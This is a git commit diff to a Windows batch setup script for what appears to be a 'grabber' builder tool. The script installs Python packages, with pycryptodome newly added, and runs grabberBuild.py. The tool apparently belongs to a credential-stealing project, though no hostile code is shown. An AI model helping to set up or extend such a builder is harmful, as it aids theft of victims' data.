2120c086711583fa380151a1b80d696ed78ebd4f
Paloox <167614497+Paloox@users.noreply.github.com>
2024-06-28 18:03:17 +0200

    Update setup-grabberTool.bat

--- sites/files/setup-grabberTool.bat
+++ sites/files/setup-grabberTool.bat
@@ -2,5 +2,5 @@
 :: You have a question? add me on discord: p4u1_
 
 @echo off
-python -m pip install requests colorama pystyle pywin32
+python -m pip install requests colorama pystyle pywin32 pycryptodome
 python grabberBuild.py
